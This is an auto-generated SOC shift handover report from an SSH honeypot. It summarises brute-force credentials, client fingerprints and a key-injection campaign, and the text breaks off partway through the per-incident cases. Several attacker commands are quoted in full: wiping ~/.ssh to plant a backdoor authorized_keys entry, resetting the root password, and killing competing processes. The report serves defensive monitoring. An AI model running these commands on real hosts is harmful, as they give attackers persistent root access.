# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-10 |
| **Generated At** | 2026-04-10T22:35:39Z |
| **Shift Time** | 22:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **48** |
| Confirmed Threats | **45** |
| False Positives Filtered | **3** (6.2%) |
| Unique Attacker IPs | **10** |
| Countries of Origin | **4** |
| High Severity Cases | **17** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **31** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **21** |
| Unique Credential Pairs | **17** |
| Unique Usernames | **4** |
| Unique Passwords | **17** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 17 |
| `345gs5662d34` | 2 |
| `user1` | 1 |
| `gustavo` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1234` | 2 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `123123dd@` | 2 |
| `root!@` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `1234` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `123123dd@` | 2 |
| `root` | `root!@` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1234` | `172.215.231.113` | 2026-04-10T20:50:12 |
| `root` | `root!@` | `129.121.79.67` | 2026-04-10T20:51:58 |
| `root` | `3245gs5662d34` | `129.121.79.67` | 2026-04-10T20:52:04 |
| `root` | `ccZZ123123` | `102.88.137.80` | 2026-04-10T20:53:46 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-04-10T20:53:53 |
| `root` | `12345678` | `52.159.243.195` | 2026-04-10T21:04:15 |
| `root` | `1` | `52.242.243.99` | 2026-04-10T21:04:31 |
| `root` | `1212` | `172.215.231.113` | 2026-04-10T21:19:52 |
| `root` | `1234` | `52.242.243.99` | 2026-04-10T21:23:59 |
| `root` | `1234567` | `52.242.243.99` | 2026-04-10T21:44:22 |
| `root` | `Aa111111!` | `14.103.74.80` | 2026-04-10T21:45:09 |
| `root` | `123123aa!` | `52.159.243.195` | 2026-04-10T21:51:25 |
| `root` | `123123` | `172.215.231.113` | 2026-04-10T22:01:42 |
| `root` | `123123@` | `172.215.231.113` | 2026-04-10T22:07:42 |
| `root` | `123123dd@` | `172.215.231.113` | 2026-04-10T22:13:42 |
| `root` | `123123dd@` | `52.159.243.195` | 2026-04-10T22:25:29 |
| `root` | `123123dd!` | `172.215.231.113` | 2026-04-10T22:25:45 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **48** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 33 |
| Go SSH scanner | 12 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 29 | 3 |
| `16443846184e...` | Generic scanner | 12 | 3 |
| `713bd9cc9355...` | Mirai/variant | 3 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 29 | 3 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 12 | 3 | Generic scanner |
| `713bd9cc9355...` | libssh | 3 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:B73Qx5n4SdeE"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.74.80`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `129.121.79.67`, `102.88.137.80`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **10** |
| Unique ASNs | **1** |
| High-Risk ASNs | **1** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 10 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (17)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e57e4aa7efdb

| Field | Detail |
|---|---|
| **Source IP** | `172.215.231[.]113` |
| **First Seen** | 2026-04-10 20:50 |
| **Last Seen** | 2026-04-10 20:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `netstat -tulpn | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 20:50:11` | `cowrie.session.connect` |
| `2026-04-10 20:50:11` | `cowrie.client.version` |
| `2026-04-10 20:50:12` | `cowrie.client.kex` |
| `2026-04-10 20:50:12` | `cowrie.login.success` |
| `2026-04-10 20:50:13` | `cowrie.session.params` |
| `2026-04-10 20:50:13` | `cowrie.command.input` |
| `2026-04-10 20:50:14` | `cowrie.log.closed` |
| `2026-04-10 20:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.215.231[.]113` to AbuseIPDB if not already reported
- [ ] Block `172.215.231[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39ac42d4d340

| Field | Detail |
|---|---|
| **Source IP** | `129.121.79[.]67` |
| **First Seen** | 2026-04-10 20:51 |
| **Last Seen** | 2026-04-10 20:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 20:51:56` | `cowrie.session.connect` |
| `2026-04-10 20:51:56` | `cowrie.client.version` |
| `2026-04-10 20:51:56` | `cowrie.client.kex` |
| `2026-04-10 20:51:58` | `cowrie.login.success` |
| `2026-04-10 20:51:58` | `cowrie.session.params` |
| `2026-04-10 20:51:58` | `cowrie.command.input` |
| `2026-04-10 20:51:58` | `cowrie.command.failed` |
| `2026-04-10 20:51:58` | `cowrie.log.closed` |
| `2026-04-10 20:51:59` | `cowrie.session.params` |
| `2026-04-10 20:51:59` | `cowrie.command.input` |
| `2026-04-10 20:51:59` | `cowrie.session.file_download` |
| `2026-04-10 20:51:59` | `cowrie.log.closed` |
| `2026-04-10 20:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.79[.]67` to AbuseIPDB if not already reported
- [ ] Block `129.121.79[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64141399ea51

| Field | Detail |
|---|---|
| **Source IP** | `129.121.79[.]67` |
| **First Seen** | 2026-04-10 20:52 |
| **Last Seen** | 2026-04-10 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 20:52:03` | `cowrie.session.connect` |
| `2026-04-10 20:52:03` | `cowrie.client.version` |
| `2026-04-10 20:52:03` | `cowrie.client.kex` |
| `2026-04-10 20:52:04` | `cowrie.login.success` |
| `2026-04-10 20:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.79[.]67` to AbuseIPDB if not already reported
- [ ] Block `129.121.79[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd7e894d653e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-10 20:53 |
| **Last Seen** | 2026-04-10 20:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 20:53:45` | `cowrie.session.connect` |
| `2026-04-10 20:53:45` | `cowrie.client.version` |
| `2026-04-10 20:53:45` | `cowrie.client.kex` |
| `2026-04-10 20:53:46` | `cowrie.login.success` |
| `2026-04-10 20:53:47` | `cowrie.session.params` |
| `2026-04-10 20:53:47` | `cowrie.command.input` |
| `2026-04-10 20:53:47` | `cowrie.command.failed` |
| `2026-04-10 20:53:47` | `cowrie.log.closed` |
| `2026-04-10 20:53:48` | `cowrie.session.params` |
| `2026-04-10 20:53:48` | `cowrie.command.input` |
| `2026-04-10 20:53:48` | `cowrie.session.file_download` |
| `2026-04-10 20:53:48` | `cowrie.log.closed` |
| `2026-04-10 20:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4fd74b23ce

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-10 20:53 |
| **Last Seen** | 2026-04-10 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 20:53:52` | `cowrie.session.connect` |
| `2026-04-10 20:53:52` | `cowrie.client.version` |
| `2026-04-10 20:53:52` | `cowrie.client.kex` |
| `2026-04-10 20:53:53` | `cowrie.login.success` |
| `2026-04-10 20:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-383bbdc92586

| Field | Detail |
|---|---|
| **Source IP** | `52.159.243[.]195` |
| **First Seen** | 2026-04-10 21:04 |
| **Last Seen** | 2026-04-10 21:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 21:04:14` | `cowrie.session.connect` |
| `2026-04-10 21:04:14` | `cowrie.client.version` |
| `2026-04-10 21:04:14` | `cowrie.client.kex` |
| `2026-04-10 21:04:15` | `cowrie.login.success` |
| `2026-04-10 21:04:16` | `cowrie.session.params` |
| `2026-04-10 21:04:16` | `cowrie.command.input` |
| `2026-04-10 21:04:16` | `cowrie.log.closed` |
| `2026-04-10 21:04:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.159.243[.]195` to AbuseIPDB if not already reported
- [ ] Block `52.159.243[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a149e3387ed6

| Field | Detail |
|---|---|
| **Source IP** | `52.242.243[.]99` |
| **First Seen** | 2026-04-10 21:04 |
| **Last Seen** | 2026-04-10 21:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `pwd` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 21:04:30` | `cowrie.session.connect` |
| `2026-04-10 21:04:30` | `cowrie.client.version` |
| `2026-04-10 21:04:31` | `cowrie.client.kex` |
| `2026-04-10 21:04:31` | `cowrie.login.success` |
| `2026-04-10 21:04:32` | `cowrie.session.params` |
| `2026-04-10 21:04:32` | `cowrie.command.input` |
| `2026-04-10 21:04:32` | `cowrie.log.closed` |
| `2026-04-10 21:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.242.243[.]99` to AbuseIPDB if not already reported
- [ ] Block `52.242.243[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a46bb73e648a

| Field | Detail |
|---|---|
| **Source IP** | `172.215.231[.]113` |
| **First Seen** | 2026-04-10 21:19 |
| **Last Seen** | 2026-04-10 21:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 21:19:51` | `cowrie.session.connect` |
| `2026-04-10 21:19:51` | `cowrie.client.version` |
| `2026-04-10 21:19:52` | `cowrie.client.kex` |
| `2026-04-10 21:19:52` | `cowrie.login.success` |
| `2026-04-10 21:19:53` | `cowrie.session.params` |
| `2026-04-10 21:19:53` | `cowrie.command.input` |
| `2026-04-10 21:19:53` | `cowrie.log.closed` |
| `2026-04-10 21:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.215.231[.]113` to AbuseIPDB if not already reported
- [ ] Block `172.215.231[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fd622f866e9

| Field | Detail |
|---|---|
| **Source IP** | `52.242.243[.]99` |
| **First Seen** | 2026-04-10 21:23 |
| **Last Seen** | 2026-04-10 21:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 21:23:58` | `cowrie.session.connect` |
| `2026-04-10 21:23:58` | `cowrie.client.version` |
| `2026-04-10 21:23:58` | `cowrie.client.kex` |
| `2026-04-10 21:23:59` | `cowrie.login.success` |
| `2026-04-10 21:24:00` | `cowrie.session.params` |
| `2026-04-10 21:24:00` | `cowrie.command.input` |
| `2026-04-10 21:24:00` | `cowrie.log.closed` |
| `2026-04-10 21:24:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.242.243[.]99` to AbuseIPDB if not already reported
- [ ] Block `52.242.243[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7edee6a4b344

| Field | Detail |
|---|---|
| **Source IP** | `52.242.243[.]99` |
| **First Seen** | 2026-04-10 21:44 |
| **Last Seen** | 2026-04-10 21:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 21:44:21` | `cowrie.session.connect` |
| `2026-04-10 21:44:21` | `cowrie.client.version` |
| `2026-04-10 21:44:21` | `cowrie.client.kex` |
| `2026-04-10 21:44:22` | `cowrie.login.success` |
| `2026-04-10 21:44:23` | `cowrie.session.params` |
| `2026-04-10 21:44:23` | `cowrie.command.input` |
| `2026-04-10 21:44:23` | `cowrie.log.closed` |
| `2026-04-10 21:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.242.243[.]99` to AbuseIPDB if not already reported
- [ ] Block `52.242.243[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d2b0c1fcf21

| Field | Detail |
|---|---|
| **Source IP** | `14.103.74[.]80` |
| **First Seen** | 2026-04-10 21:45 |
| **Last Seen** | 2026-04-10 21:45 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:B73Qx5n4SdeE"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 21:45:07` | `cowrie.session.connect` |
| `2026-04-10 21:45:07` | `cowrie.client.version` |
| `2026-04-10 21:45:07` | `cowrie.client.kex` |
| `2026-04-10 21:45:09` | `cowrie.login.success` |
| `2026-04-10 21:45:09` | `cowrie.session.params` |
| `2026-04-10 21:45:09` | `cowrie.command.input` |
| `2026-04-10 21:45:09` | `cowrie.command.failed` |
| `2026-04-10 21:45:10` | `cowrie.log.closed` |
| `2026-04-10 21:45:10` | `cowrie.session.params` |
| `2026-04-10 21:45:10` | `cowrie.command.input` |
| `2026-04-10 21:45:10` | `cowrie.session.file_download` |
| `2026-04-10 21:45:10` | `cowrie.log.closed` |
| `2026-04-10 21:45:22` | `cowrie.session.params` |
| `2026-04-10 21:45:22` | `cowrie.command.input` |
| `2026-04-10 21:45:22` | `cowrie.log.closed` |
| `2026-04-10 21:45:23` | `cowrie.session.params` |
| `2026-04-10 21:45:23` | `cowrie.command.input` |
| `2026-04-10 21:45:23` | `cowrie.log.closed` |
| `2026-04-10 21:45:23` | `cowrie.session.params` |
| `2026-04-10 21:45:23` | `cowrie.command.input` |
| `2026-04-10 21:45:23` | `cowrie.session.file_download` |
| `2026-04-10 21:45:23` | `cowrie.log.closed` |
| `2026-04-10 21:45:24` | `cowrie.session.params` |
| `2026-04-10 21:45:24` | `cowrie.command.input` |
| `2026-04-10 21:45:24` | `cowrie.log.closed` |
| `2026-04-10 21:45:24` | `cowrie.session.params` |
| `2026-04-10 21:45:24` | `cowrie.command.input` |
| `2026-04-10 21:45:24` | `cowrie.log.closed` |
| `2026-04-10 21:45:25` | `cowrie.session.params` |
| `2026-04-10 21:45:25` | `cowrie.command.input` |
| `2026-04-10 21:45:25` | `cowrie.command.input` |
| `2026-04-10 21:45:25` | `cowrie.log.closed` |
| `2026-04-10 21:45:26` | `cowrie.session.params` |
| `2026-04-10 21:45:26` | `cowrie.command.input` |
| `2026-04-10 21:45:28` | `cowrie.log.closed` |
| `2026-04-10 21:45:29` | `cowrie.session.params` |
| `2026-04-10 21:45:29` | `cowrie.command.input` |
| `2026-04-10 21:45:29` | `cowrie.log.closed` |
| `2026-04-10 21:45:29` | `cowrie.session.params` |
| `2026-04-10 21:45:29` | `cowrie.command.input` |
| `2026-04-10 21:45:29` | `cowrie.log.closed` |
| `2026-04-10 21:45:30` | `cowrie.session.params` |
| `2026-04-10 21:45:30` | `cowrie.command.input` |
| `2026-04-10 21:45:30` | `cowrie.log.closed` |
| `2026-04-10 21:45:30` | `cowrie.session.params` |
| `2026-04-10 21:45:30` | `cowrie.command.input` |
| `2026-04-10 21:45:30` | `cowrie.log.closed` |
| `2026-04-10 21:45:31` | `cowrie.session.params` |
| `2026-04-10 21:45:31` | `cowrie.command.input` |
| `2026-04-10 21:45:31` | `cowrie.log.closed` |
| `2026-04-10 21:45:31` | `cowrie.session.params` |
| `2026-04-10 21:45:31` | `cowrie.command.input` |
| `2026-04-10 21:45:31` | `cowrie.log.closed` |
| `2026-04-10 21:45:32` | `cowrie.session.params` |
| `2026-04-10 21:45:32` | `cowrie.command.input` |
| `2026-04-10 21:45:32` | `cowrie.log.closed` |
| `2026-04-10 21:45:32` | `cowrie.session.params` |
| `2026-04-10 21:45:32` | `cowrie.command.input` |
| `2026-04-10 21:45:32` | `cowrie.log.closed` |
| `2026-04-10 21:45:33` | `cowrie.session.params` |
| `2026-04-10 21:45:33` | `cowrie.command.input` |
| `2026-04-10 21:45:33` | `cowrie.log.closed` |
| `2026-04-10 21:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.74[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.74[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49794a49cea5

| Field | Detail |
|---|---|
| **Source IP** | `52.159.243[.]195` |
| **First Seen** | 2026-04-10 21:51 |
| **Last Seen** | 2026-04-10 21:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `netstat -tulpn | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 21:51:23` | `cowrie.session.connect` |
| `2026-04-10 21:51:23` | `cowrie.client.version` |
| `2026-04-10 21:51:24` | `cowrie.client.kex` |
| `2026-04-10 21:51:25` | `cowrie.login.success` |
| `2026-04-10 21:51:25` | `cowrie.session.params` |
| `2026-04-10 21:51:25` | `cowrie.command.input` |
| `2026-04-10 21:51:26` | `cowrie.log.closed` |
| `2026-04-10 21:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.159.243[.]195` to AbuseIPDB if not already reported
- [ ] Block `52.159.243[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1bcb46cf443

| Field | Detail |
|---|---|
| **Source IP** | `172.215.231[.]113` |
| **First Seen** | 2026-04-10 22:01 |
| **Last Seen** | 2026-04-10 22:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ps aux | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 22:01:41` | `cowrie.session.connect` |
| `2026-04-10 22:01:41` | `cowrie.client.version` |
| `2026-04-10 22:01:41` | `cowrie.client.kex` |
| `2026-04-10 22:01:42` | `cowrie.login.success` |
| `2026-04-10 22:01:43` | `cowrie.session.params` |
| `2026-04-10 22:01:43` | `cowrie.command.input` |
| `2026-04-10 22:01:43` | `cowrie.log.closed` |
| `2026-04-10 22:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.215.231[.]113` to AbuseIPDB if not already reported
- [ ] Block `172.215.231[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ba53fedd6fd

| Field | Detail |
|---|---|
| **Source IP** | `172.215.231[.]113` |
| **First Seen** | 2026-04-10 22:07 |
